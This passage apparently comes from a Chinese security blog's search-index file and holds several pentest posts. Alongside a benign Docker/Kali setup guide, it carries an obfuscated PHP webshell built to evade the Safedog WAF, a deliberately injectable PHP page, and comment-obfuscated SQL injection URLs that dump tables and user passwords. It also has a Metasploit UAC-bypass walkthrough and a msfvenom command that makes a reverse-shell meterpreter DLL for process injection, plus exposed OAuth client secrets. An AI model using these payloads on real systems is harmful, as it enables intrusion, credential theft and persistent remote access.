(pBuf != NULL) &#123; wprintf(L&quot;\n\tAccount: %s\n&quot;, pBuf-&gt;usri4_name); wprintf(L&quot;\tComment: %s\n&quot;, pBuf-&gt;usri4_comment); wprintf(L&quot;\tUser comment: %s\n&quot;, pBuf-&gt;usri4_usr_comment); wprintf(L&quot;\tFull name: %s\n&quot;, pBuf-&gt;usri4_full_name); wprintf(L&quot;\tpriv: %d\n&quot;, pBuf-&gt;usri4_priv); &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) NetApiBufferFree(pBuf); return 0;&#125;/************************************** wmain* 功能 入口函数，根据参数判断需要调用的功能函数* 参数 参见usage输出**************************************/int __cdecl wmain(int ac, wchar_t * av[])&#123; if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-a&quot;) == 0) &#123; AddUser(NULL, av[2], av[3]); &#125; else if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-g&quot;) == 0) &#123; AddUserToGroup(NULL, av[2], av[3]); &#125; else if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0) &#123; ShowUsersInfo(NULL, av[2]); &#125; else if (ac == 2 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0) &#123; ListUsers(NULL); ListGroup(NULL); &#125; else if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-d&quot;) == 0) &#123; DelUser(NULL, av[2]); &#125; else &#123; printf(&quot;usage: \n&quot; &quot;\t %ws -a &lt;username&gt; &lt;password&gt; to add a user\n&quot; &quot;\t %ws -g &lt;username&gt; &lt;group&gt; add a user to a group&quot; &quot;\t %ws -i &lt;username&gt; to show user info\n&quot; &quot;\t %ws -d &lt;username&gt; to del a user\n&quot;, av[0], av[0], av[0], av[0]); &#125; return 0;&#125; 5.欢迎下方一起参与讨论&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>bypass</category>
+      </categories>
+      <tags>
+        <tag>bypass,渗透,web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Bypass_safedog系列1]]></title>
+    <url>%2Fbypass_shell.html</url>
+    <content type="text"><![CDATA[环境:php+mysql+apche安全狗:apache版本+8.10规则库即刻安全即刻安全纯技术交流群：307283889如需转载，请联系本博主声明，私自转载必追究 Prat 1在bypass小分队中V@1n3R表哥提到他明天会分享过waf的一句话爱搞事的我当然不能只做伸手党,于是决定也分享一些出来,可是发现许久没有做渗透测试了手里并没有过waf的一句话了，没办法只好临时刚几个出来 思路构思以及实现本次bypass需要用的一个函数： substr() //用于返回字符串的一部分。 其实这个想法很早就有了，不过好像也有大佬有成品，不过我没看见过(可能是很久没接触渗透测试了)于是今天晚上就试了一下其实不管怎么绕过，一句话最终还是：1assert($_POST['x']); 所谓的绕过无非就是把这一段进行处理让他达到一个过waf的效果 Prat 2巧用substr函数绕过安全狗思路成品：12345678910&lt;?php $a = substr("abcdefghijklmnopqrstufwxyz",0,1); $b = substr("abcdefghijklmnopqrstufwxyz",17,3); $c = substr("abcdefghijklmnopqrstufwxyz",3,2); $ss = $a.$b.$c; $d = $ss[0].$ss[2].$ss[2]; //ass $dd = $ss[5].$ss[1].$ss[3]; //ert $x = $d.$dd;$x($_POST['x']);?&gt; 这里主要关注这两行123$d = $ss[0].$ss[2].$ss[2]; //ass$dd = $ss[5].$ss[1].$ss[3]; //ert$x = $d.$dd; 上面说了，一句话最终结果还是assert($_POST[‘x’]); 所以这里的$x肯定是assert输出一下就知道。如图：可以看见echo 出来了assert那么他是如何得到assert的呢，我们来看一下1$x = $d.$dd; 可以发现，$x通过$d跟$dd拼接得到的$d跟$dd是通过截取$ss的字符串得到的我们分别来输出一下每一个变量获取到的字符串可以发现1234$a = a //从字符串的第0个字符开始截取，向右截取1个字符$b = rst //从字符串的第17个字符开始截取，向右截取3个字符$c = de //从字符串的第17个字符开始截取，向右截取3个字符$ss = arstde //为三个变量的拼接的来 那么整个过程就很好理解123$d = ass //分别截取$ss的第0,2,2字符$dd = ert //分别截取$ss的第5,1,3字符最后拼接成assert 看一下是否能过狗完美过狗，并没有拦截 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>bypass</category>
+      </categories>
+      <tags>
+        <tag>bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Bypass_safedog系列2]]></title>
+    <url>%2Fbypass_safedog.html</url>
+    <content type="text"><![CDATA[环境:php+mysql+apche安全狗:apache版本+8.10规则库即刻安全即刻安全纯技术交流群：307283889如需转载，请练习本博主声明，私自转载必追究 prat 1本文大致内容12345678+ 思路以及想法 - 四重注释绕过safedog+ 实战绕过 - 绕过and 1=1 - 绕过union+select - 爆表 - 爆字段 - 读内容 prat 2测试代码123456789101112131415&lt;?php$link = mysqli_connect('localhost','root','root','security');$sql = "select * from users where id=".$_GET['id'];$result = mysqli_query($link,$sql);if($rows = mysqli_fetch_array($result))&#123; echo $rows['id']; echo '&lt;br&gt;'; echo $rows['username']; echo '&lt;br&gt;'; echo $rows['password']; echo '&lt;br&gt;';&#125;mysqli_close($link);?&gt; prat 3绕过 and 1=11url:http://192.168.1.107/sql.php?id=1 and 1=1 发现惨遭拦截，首先让我们来看一下他拦截什么，不拦截什么。1234and 不拦截and 1 拦截and 1 = 拦截and 1 = 1 拦截 由此可见，只要and后面出现数字或者成立一个等式那么他就拦截，那我们用/**/注释来绕过一下看看1/**/aNd/**//**/&apos;a&apos;/**/ = /**/&apos;a&apos;/**/ 注释包含把1=1替换成‘a’ = ‘a’就得到了url:1http://192.168.1.107/sql.php?id=1/**/aNd/**//**/&apos;a&apos;/**/=/**/&apos;b&apos;/**/ 返回不正常(等式不等)并且发现狗就不拦截了，可见注释方法还是如此任性 Order by我发现我装的狗是不会拦截order by的，所以也就没绕，有需求在说。字段为3，接下来爆库，当前用户。 绕过union+select1url:http://192.168.1.107/sql.php?id=1 UNION SELECT 1,2,3 同样，先看一下他拦截什么。123union 不拦截select 不拦截union select 拦截 很明显，我们只需要在union与select之间处理一下就可以了。首先使用/!50000/注释包含/!/然后使用/**/与/–*/打乱一下结构，在稍微进行一下编码处理就可以了1url:http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,2,3)/*--*/*/-- - 可以发现，已经正常显示数字，并且狗没有拦截。 什么？你说没看懂？那么看下图拆分一下就发现其实很好理解，使用()把select的内容包起来。 爆库1http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user(),database())/*--*/*/-- - 发现又特么拦截了，很明显，他会拦截一些常用系统函数(还有许多就不列出来了，列出常用的)123451. version()——MySQL 版本2. user()——数据库用户名3. database()——数据库名4. @@datadir——数据库路径5. @@version_compile_os——操作系统版本 既然已经知道了拦截什么，那么绕他还难么，掏出/**/注释大法。在user(),database()之间处理以下。那么就成为了123user/**/(/**/)database/**/(/**/)完整url：http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user/**/(/**/),database/**/(/**/))/*--*/*/-- - 正常爆出数据库跟当前用户 爆表发现我本身的狗可能有点问题，他不拦截from，于是也没有绕，还是那句话，需要啥，绕啥。123url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,table_name)),user/**/(/**/)from information_schema.tables where table_schema=&apos;security&apos;)/*--*/*/ limit 0,1-- - 得到table1234emailsreferersuagentsusers 爆字段123url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,column_name)),user/**/(/**/)from information_schema.columns where table_name=&apos;users&apos;)/*--*/*/ limit 0,1-- - 得到column123idusernamepassword 读内容123url:http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,username,password)),user/**/(/**/)from users)/*--*/*/ limit 0,1-- - dump1Dumb#Dumb var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>bypass</category>
+      </categories>
+      <tags>
+        <tag>bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Bypassuac_Comhijack ---kali linux]]></title>
+    <url>%2Fbypassuac-comhijack.html</url>
+    <content type="text"><![CDATA[前天看了一个国外大牛的视频，觉得很有意思。就决定和你们分享一下 https://www.youtube.com/watch?v=HNRrmfuTRCY https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/ UAC简称 用户帐户控制， UAC 是Windows Vista中引入了通过防止程序的管理权限，除非批准的用户提供额外的安全功能。以下是用户在尝试运行程序或访问需要许可的Windows的一部分时可能看到的UAC确认对话框的图片。 Metasploit模块 https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb 该模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些高完整性流程时，将引用这些注册表项，从而导致加载用户控制的DLL的进程。这些DLL包含导致高级会话的有效载荷。有效负载调用后清除注册表项的修改。该模块需要有效负载的架构来匹配操作系统，但目前的低权限Meterpreter会话架构可能不同。如果在单独的进程中启动有效负载后指定EXE :: Custom，您的DLL应该调用ExitProcess（）。该模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，则此模块将无法正常运行。 （以上引用大神文章） 视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/bypassuac_comhijack.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); 1.下载bypassuac_comhijack.rb curl -o bypassuac_comhijack.rb https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb &nbsp;&nbsp;&nbsp;&nbsp;2.将下载的bypassuac_comhijack.rb 剪贴到msf 中&nbsp;&nbsp; 需要的到一个Meterprerter的会话 比如我这里使用我个人的脚本,第三个得到Meterprerter的会话。&nbsp;&nbsp; &nbsp; 3.使用bypassuac_comhijack&nbsp;&nbsp;&nbsp;看到需要设置的是会话序列号，我这里设置 session 为 1，并且执行payload的时候，会报错，让我们看看需要更改的地方？&nbsp;&nbsp;因为目标虚拟机win10镜像本身是x64架构的，所以我们这里需要更改payload&nbsp;&nbsp;&nbsp;并且更改端口&nbsp;（PS:如果目标机是32位的话，不用更改PAYLOAD 只需更改端口即可） 4.得到session 2&nbsp;&nbsp;这里可以看到 我getuid的时候 是demon 用户当我getsystem的时候 ，得到了system权限。&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>Metasploit</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[我的Docker不归路--重新认识docker]]></title>
+    <url>%2F%E6%88%91%E7%9A%84%E5%9B%9E%E5%BD%92docker.html</url>
+    <content type="text"><![CDATA[我的Docker不归路——(回归之作)&nbsp; 0x01 docker 简介&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（这篇文章本是不打算公开的，写下这篇文章本是在四月份的，现在打算将其公开）前段时间写了一份Dcoker_kali，docker对我来说可以使用docker_kalil inux,也可以部署我们安全工作的靶机环境，如前段时间，在我的msf系列课程中就用到了，如何部署docker-s2-046的靶机环境。它对我来说应用不止这么一点，可以部署DVWA、WebGoat等渗透环境，可当做一个渗透演练平台。之前留了一部分坑在那，这次我打算好好的完善此Docker_kali使用内容。&nbsp;&nbsp;重新认识Docker &nbsp;&nbsp;&nbsp;Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的运行效率，降低了云计算资源供应的成本！ 使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，以在有限的时间内做更多有意义的事。&nbsp;&nbsp;在安装前，先了解一些主要的概念&nbsp;Docker 在Linux上安装过程里，你的物理机器既是本地主机也是Docker的宿主机。在网络里，本地主机的意思是你的计算机。Docker的宿主机是托管这容器运行的计算机。 &nbsp;在一个标准的Linux安装中，Docker客户端、Docker Daemon和一些运行中的容器会直接寄托在你的本地主机上。这意味着你可以使用标准的本地地址和端口去访问容器为什么要使用 Docker？ &nbsp;作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。 更高效的利用系统资源 &nbsp;由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。 更快速的启动时间 &nbsp;传统的虚拟机技术启动应用服务往往需要数分钟，而 Docker 容器应用，由于直接运行于宿主内核，无需启动完整的操作系统，因此可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。 一致的运行环境 &nbsp;开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 “这段代码在我机器上没问题啊” 这类问题。 持续交付和部署 &nbsp;对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。 &nbsp;使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery/Deployment) 系统进行自动部署。 &nbsp;而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像。 更轻松的迁移 &nbsp;由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，甚至是笔记本，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。 更轻松的维护和扩展 &nbsp;Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。&nbsp;&nbsp;参考资料:https://yeasy.gitbooks.io/docker_practice/content/introduction/why.html&nbsp;&nbsp; 0x02windows 下安装docker&nbsp;Docker for Windows的安装与使用&nbsp;&nbsp;&nbsp;在Windows 10中，下载Docker for Windows的安装包，然后开始安装。正如上面所述，如果Hyper-V没有启用，安装过程会自动启用Hyper-V，这将需要重新启动Windows系统。安装完成后，就可以在Windows下使用Docker了。在安装docker for windows 之后 不能安装vm、vbox等虚拟机，如需安装vbox、vm等虚拟机可采用下一个docker tools box 安装方法。&nbsp; &nbsp;启动Docker for Windows，会在系统托盘部分显示一条小鲸鱼的图标：。在Docker完全启动之前，小鲸鱼背上的小方块会不停地闪烁变化，等小方块稳定不变后，表示系统完全启动成功，此时就可以对Docker的环境进行设置，或者开始执行Docker命令了。&nbsp;&nbsp;&nbsp;在Docker for Windows成功启动后，就可以在CMD下执行Docker命令了.&nbsp;&nbsp;Docker tools box的安装与使用 &nbsp;因为Docker Engine守护程序使用特定于Linux的内核功能，因此无法在Windows上本机运行Docker Engine。相反，你必须使用docker命令 docker-machine，创建并连接到一个小型的Linux VM您的计算机上。该VM在Windows系统上为您托管Docker Engine。 &nbsp;要运行Docker，您的计算机必须具有运行Windows 7或更高版本的64位操作系统。另外，您必须确保在您的计算机上启用虚拟化。 0x001&nbsp; 0x002&nbsp;安装完会有VirtualBox/Docker Quickstart Terminal /kitematic (GUI图形化管理工具)&nbsp;&nbsp;&nbsp; 0x003启动Dcoker tools box 报错该解决？ 解决方案：（Windows环境下手动更新boot2docker.iso）下载boot2docker.ISO 进行替换该C盘当前用户目录下的 .docker/machine/cache\boot2docker.iso 的boot2docker.iso这个镜像文件进行一个替换 即可解决下载错误。 0x03 linux下安装dockerlinux下安装docker最低系统安装要求为： Ubuntu 版本最低为 12.04 LTS，但从稳定性上考虑，推荐使用 14.04 LTS 或更高的版本。Debian 7 Wheezy (64-bit)（必须启用 backports)linux下安装docker 使用以下命令即可进行安装。我这边就使用深度linux64位 来举例子安装在linux下安装说明吧！ apt-get install docker.io &nbsp;建立 docker 用户组&nbsp; 默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组安装docker.io 的时候已经自动添加了docker用户组，只需将当前非root权限的用户 添加docker组即可 usermod -aG docker $USER &nbsp;&nbsp;&nbsp; 0x04 Mac os X 下 安装苹果系统安装我这里就没什么好说的了，苹果系统下的都是一键安装的。Docker for mac 下载链接：https://www.docker.com/docker-mac去官网下载docker安装即可&nbsp;将安装包下载后，拖放应用程序即可。&nbsp;安装后，启动docker后可在，右上角看到docker -小鲸鱼的图标。 &nbsp;安装后可在终端下直接使用docker命令。&nbsp; &nbsp;&nbsp; 0x10 Docker 常用命令简单使用实例&nbsp;1.搜索镜像&nbsp; docker search 镜像名称 kali官方 docker镜像拉取说明:https://www.kali.org/news/official-kali-linux-docker-images/ 搜索kali 镜像 docker search kali &nbsp;2.docker_kali镜像拉取下载&nbsp; docker pull kalilinux/kali-linux-docker&nbsp; 不过在这里会产生一个问题，镜像下载慢！！因为镜像在国外,所以下载过程可能会延迟掉线这样会非常不友好。 &nbsp; 3.我们可以使用几个国内的docker镜像加速器 阿里云加速器&amp;DaoCloud 加速器！！！！！&nbsp;如果你使用的docker是docker for windows 、或者docker for mac 的话 推荐可使用‘DaoCloud 加速器’ https://www.daocloud.io/mirror#accelerator-doc &nbsp;一、在‘DaoCloud 加速器’ 注册登录后 进行复制镜像地址，到docker下进行设置。&nbsp; 二、右键点击桌面顶栏的 docker 图标，选择 Preferences，找到Daemon，在registy mirrors 中添加，并应用重启docker（apply&amp;restart）&nbsp; 4.如果你是linux 或者docker tools box 的话 可以选择阿里云加速器–docker镜像仓库。&nbsp;https://account.aliyun.com/login/login.htmoauth_callback=https%3A%2F%2Fcr.console.aliyun.com%2F&amp;lang=zh#/accelerator &nbsp;查看阿里云加速器操作文档，以及docker的版本，进行对应操作。&nbsp;&nbsp;配置完之后，镜像开启加速下载如下图；&nbsp; 5.创建并连接容器、端口映射、绑定随机id&nbsp; docker run -i -t –name kali -p 8081:80 -p 8080:8080 -p 4444:4444 -p 5555:5555 -p 2222:22 kalilinux/kali-linux-docker /bin/bash &nbsp;&nbsp;命令详解：一、run命令简单使用docker run -i -t //创建并连接容器， run命令参数使用 -i: 以交互模式运行容器，通常与 -t 同时使用；-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用&nbsp;在这里我们使用docker ps -a 查看docker容器运行、创建的历史记录，可以发现你每次创建一个容器的时候都会生成一个随机id、容器名称，在81324e6f0059我们可以看到，这是我们之前生成的，也是指定了容器的名称，将ID、名称附着在容器上。docker ps -a二、Docker 会为我们创建每一个容器自动生成一个随机ID、名称，如果想为容器指定一个名称，而不是使用自动生成的，则可以使用–name 来使用&nbsp;如：–name kali //指定容器名称为kali三、容器端口映射docker指令：docker run -p ip:hostPort:containerPort redis&nbsp;使用-p参数会分配宿主机的端口映射到虚拟机。IP表示主机的IP地址。hostPort表示宿主机的端口。containerPort表示虚拟机的端口。以下为端口映射实例图片对比：我们也可以采用 指定容器端口映射本机随机端口,防止本机端口占用等情况。格式为-p &lt;空&gt;:容器需映射端口可指定物理机的随机端口 映射容器端口 docker run -i -t -v /Users/demon:/root -p :4444 -p :5555 -p :22 kali /bin/bash&nbsp;端口被占用&nbsp;指定随机端口为空。&nbsp;映射为随机端口&nbsp;四、使用-v 参数实现目录共享挂载，docker可以支持把一个宿主机上的目录挂载到镜像里。通过-v参数，冒号前为宿主机目录，必须为绝对路径，冒号后为镜像内挂载的路径。现在镜像内就可以共享宿主机里的文件了。然而我这边不打算采用目录共享，可用ssh的特性进行文件传输上传下载等功能docker run -i -t -v /Users/demon:/root -p :4444 -p :5555 -p :22 kali /bin/bash&nbsp;6.查看列举本地镜像。&nbsp;docker images&nbsp;7.开启容器&nbsp;start命令docker start 容器ID or 容器名称&nbsp;docker start e8d612658eb0&nbsp;容器名称可指容器随机生成的名称亦可是–name 指定过的名称 如之前指定的是kali 这里就可以使用 docker start kali8.连接容器&nbsp;attach 命令docker attach 是Docker自带的命令。下面示例如何使用该命令。但是使用 attach 命令有时候并不方便。当多个窗口同时 attach 到同一个容器的时候，所有窗口都会同步显示。当某个窗口因命令阻塞时,其他窗口也无法执行操作了。&nbsp;同样docker attach 可以接上容器名称or 容器ID&nbsp;&nbsp;使用attach 窗口占用解决方案 &nbsp; 1.使用kimtematic GUI管理工具 点击exec。&nbsp;2.使用命令行 exec命令&nbsp;&nbsp;docker exec -it kali /bin/bash&nbsp;&nbsp;&nbsp;9.停止容器&nbsp;在容器内使用exit即停止容器&nbsp;或在容器外使用stop命令即停止容器&nbsp;10.删除容器&nbsp;rm命令使用rm命令之前必须停止该运行的容器。docker rm 容器id or 容器名称&nbsp;11.批量删除停止容器&nbsp;docekr ps -a -q 查看容器停止或者正在运行的容器iddocker rm 之前也说到过 是删除容器的意思，但是docker rm 本身默认的是不会删除正在运行的容器。如此一来 docker rm $(docker ps -a -q) 的意思就是 批量删除停止的容器。12.删除本地镜像 docker rmi 镜像名or 镜像ID 删除之前需停止容器并删除和该镜像关联的容器&nbsp;&nbsp;13.将容器做备份快照迁移。Docker是基于镜像的。镜像类似于已经包含了文件、配置和安装好的程序的虚拟机镜像。同样的，你可以像启动虚拟机一样启动多个镜像实例。运行中的镜像称为容器。你可以修改容器（比如删除一个文件），但这些修改不会影响到镜像。不过，你使用docker commit 命令可以把一个正在运行的容器变成一个新的镜像。&nbsp;docker save : 将指定镜像保存成 tar 归档文件。&nbsp;Export命令用于持久化容器（不是镜像）。&nbsp;以上同样都是导出，但是区别在于save 是导出镜像而不是导出容器，export是导出容器，历史记录但不能历史层回滚。反而使用export命令导出保存快照，你将无法回滚到之前的层(layer)。以下是使用导入save的镜像以及export的镜像，导入镜像的大小。&nbsp;&nbsp;docker load -i kali.tar &nbsp;&nbsp;docker import kali.tar kali&nbsp;&nbsp;&nbsp;14 .docker 资源占用之内存docker stats可以观察到此时的资源使用情况是固定不变的 docker stats&nbsp;使用-m 参数可指定内容（m、g）使用docker -m操作会使内存被限制为输入大小的两倍，内存上限为400m&nbsp;可使用内存压力测试工具：stress，对内存进行测试。若运行后在几秒内被杀死说明内存被限制为400M&nbsp;&nbsp;15.尝试写一份简单的Dockerfile&nbsp;FROM kalilinux/kali-linux-docker# 拉取官方kali镜像MAINTAINER Demon#注明作者RUN apt-get update &amp;&amp; apt-get install -y \ sqlmap \ ssh \ –no-install-recommends &amp;&amp; rm -rf /var/cache/apt/archives/*.deb#使run 命令 执行 要安装的软件如安装ssh 、sqlmap 以及清理缓存ADD sshd_config /etc/ssh/#添加本地文件到容器的/etc/ssh/sshd_config 进行替换。 dockerfile实现了自动拉去镜像、构建镜像、自动更新源、下载安装sqlmap、配置ssh等动作。&nbsp;docker build -t kalil . //编写完成 Dockerfile 后可以使用docker build来生成镜像。&nbsp;&nbsp; &nbsp;创建并连接容器 docker run -i -t –name=kali -p 8081:80 -p 8080:8080 -p 4444:4444 -p 5555:5555 -p 2222:22 kalil /bin/bash.实现sqlmap ssh等配置&nbsp;实现已配置ssh 下载链接：https://github.com/boot2docker/boot2docker/releaseshttps://www.docker.com dockerhttps://www.docker.com/docker-windows docker for windowshttps://www.docker.com/docker-mac docker for machttps://www.docker.com/products/docker-toolbox docker tools box参考资料：https://my.oschina.net/aixiaohua/blog/651171 Windows环境下手动更新boot2docker.isohttp://www.cnblogs.com/franson-2016/p/6412971.html 解决非root用户使用docker的办法https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html docker入门实践亦可参考 我的好基友国光：http://www.sqlsec.com/2017/docker.html docker入门简明。http://www.tuicool.com/articles/EBNZBjJ 安全相关Docker Image收集https://my.oschina.net/zjzhai/blog/225112 Docker的save和export命令的区别http://blog.csdn.net/u010472499/article/details/52994454 Docker 资源限制之内存http://www.jb51.net/article/103483.htm Docker容器内存限制的方法http://os.51cto.com/art/201507/485007.htm Dockerfile命令介绍及实例 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[shellter]]></title>
+    <url>%2Fshellter.html</url>
+    <content type="text"><![CDATA[ShellterShellter是一个动态的shellcode注入工具，是第一个真正动态的PE infector创建的。它可以用于将shellcode注入本机Windows应用程序（目前仅适用于32位应用程序）。shellcode可以是您或您通过框架生成的东西，如Metasploit。 Shellter利用PE文件的原始结构，并不适用任何修改，如更改部分内存访问权限（除非用户想要的），添加额外的部分具有RWE访问权限，以及在AV扫描中看起来很诡异的任何内容。 Shellter采用基于目标应用程序的执行流程的独特动态方法，这只是冰山一角。Shellter不仅仅是一个EPO感染者，试图找到一个位置来插入指令来重定向执行到有效载荷。与任何其他感染者不同，Shellter的高级感染引擎从不将执行流程传输到受感染的PE文件中的代码洞穴或添加的部分。 视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/shellter.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); https://www.shellterproject.com/introducing-shellter/https://www.youtube.com/watch?v=5foouybCEk0 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
+      <categories>
+        <category>Metasploit</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[InjectProc&Metasploit]]></title>
+    <url>%2FInjectProc.html</url>
+    <content type="text"><![CDATA[视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/InjectProc.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); InjectProc流程注入是一种非常受欢迎的方法来隐藏代码的恶意行为，并被恶意软件作者大量使用。 有几种技术，通常使用：DLL注入，过程替换（也称为工艺空心），钩注射和APC注射。 大多数使用相同的Windows API函数：OpenProcess，VirtualAllocEx，WriteProcessMemory，有关这些功能的详细信息，请使用MSDN。&nbsp; DLL注入：打开目标进程。分配空间将代码写入远程进程。执行远程代码。&nbsp;具体可以看看github内容介绍。&nbsp;&nbsp;我看了大牛的视频自己学着模仿了一下使用的InjectProc.exe在cmd运行&nbsp;这位大牛在视频中演示四个部分 ，我自己也尝试了模仿了其中的一段，觉得不错，我将自己经验分享给各位。首先我使用的是—— InjectProc.exe dll_inj path/to/dll.dll notepad.exe&nbsp;首先下载到我的桌面，https://github.com/secrary/InjectProc ，和下载InjectProc.exe，是那位大牛制作完成的。&nbsp;&nbsp;&nbsp; 0x01首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。&nbsp;&nbsp;我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程InjectProc.exe dll_inj path/to/dll.dll notepad.exe。在这里我们使用InjectProc\test_files目录中的，并且我们随机打开一个进程如记事本进程。使用以下命令：得到 mbox.exe—-InjectProc弹框。并杀软未拦截的情况&nbsp;&nbsp; 0x02那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。首先我们使用msfvenom 生成dll msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll &gt;demon.dll&nbsp;&nbsp;以及打开我们的msf开启监听&nbsp;那么我们将生成好的dll 